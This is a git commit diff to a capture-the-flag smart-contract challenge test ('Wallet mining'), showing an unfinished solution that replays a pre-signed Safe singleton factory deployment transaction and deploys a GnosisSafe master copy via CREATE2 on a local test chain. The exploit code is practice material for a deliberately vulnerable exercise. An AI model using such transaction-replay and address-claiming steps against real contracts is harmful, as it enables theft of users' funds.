1840726df44f6255f947bfd307d11590ccc4d98b
Sam Calamos <sam.calamos@gmail.com>
2023-02-13 20:42:14 +1100

    still working on it:

--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -68,20 +68,29 @@ describe('[Challenge] Wallet mining', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        //  Data from https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
+        const GNOSIS_SINGLETON_DEPLOYMENT_INFO = {
+            "gasPrice": 100000000000,
+            "gasLimit": 100000,
+            "signerAddress": "0xE1CB04A0fA36DdD16a06ea828007E35e1a3cBC37",
+            "transaction": "0xf8a78085174876e800830186a08080b853604580600e600039806000f350fe7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf382f4f5a00dc4d1d21b308094a30f5f93da35e4d72e99115378f135f2295bea47301a3165a0636b822daad40aa8c52dd5132f378c0c0e6d83b4898228c7e21c84e631a0b891",
+            "address": "0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7"
+        }
+
         const attackWalletDeployer = walletDeployer.connect(player);
         const attackAuthorizer = authorizer.connect(player);
 
         const fn = attackAuthorizer.interface.getSighash("can(address,address)");
-        console.log(fn);
+        // console.log(fn);
 
-        const attackFactory = await ethers.getContractFactory("AttackWalletMiner", player);
-        const c = await attackFactory.deploy();
+        // const attackFactory = await ethers.getContractFactory("AttackWalletMiner", player);
+        // const c = await attackFactory.deploy();
 
-        await c.deploySafe();
+        // await c.deploySafe();
 
         // Transfer funds to deploying address
         const tx = {
-            to: "0xE1CB04A0fA36DdD16a06ea828007E35e1a3cBC37",
+            to: GNOSIS_SINGLETON_DEPLOYMENT_INFO.signerAddress,
             value: ethers.utils.parseEther("1")
         }
         await player.sendTransaction(tx);
@@ -91,22 +100,27 @@ describe('[Challenge] Wallet mining', function () {
         // which deploys contract at 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7
         // https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
 
-        const txRes = await ethers.provider.sendTransaction("0xf8a78085174876e800830186a08080b853604580600e600039806000f350fe7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf382f4f5a00dc4d1d21b308094a30f5f93da35e4d72e99115378f135f2295bea47301a3165a0636b822daad40aa8c52dd5132f378c0c0e6d83b4898228c7e21c84e631a0b891");
+        const txRes = await ethers.provider.sendTransaction(GNOSIS_SINGLETON_DEPLOYMENT_INFO.transaction);
         const deployerAddr = (await txRes.wait()).contractAddress;
+        console.log("deployer address is", deployerAddr)
 
         const gnosisFactory = await ethers.getContractFactory("GnosisSafe", player);
+
         
+        // Deploying the GnosisSafe must contain the salt prepended to the intialization bytecode.
         const deployRes = await (await player.sendTransaction({
             to: deployerAddr,
-            data: gnosisFactory.bytecode,
+            data: ethers.constants.HashZero + gnosisFactory.bytecode.substring(2),
             gasLimit: 30000000
         })).wait();
 
-        console.log(deployRes);
+        const gnosisMasteryCopyAddr = ethers.utils.getCreate2Address(deployerAddr, ethers.constants.HashZero, ethers.utils.keccak256(gnosisFactory.bytecode));
+        console.log("Gnosis Address")
+        console.log(gnosisMasteryCopyAddr);
 
-        const deployed = await ethers.getContractAt("GnosisSafe", "0x05d96058abc2d1122d42c8e9c01d85cf717c3cce", player);
+        const deployed = await ethers.getContractAt("GnosisSafe", gnosisMasteryCopyAddr, player);
 
-        console.log(await deployed.nonce())
+        console.log(await deployed.VERSION())
         
 
 
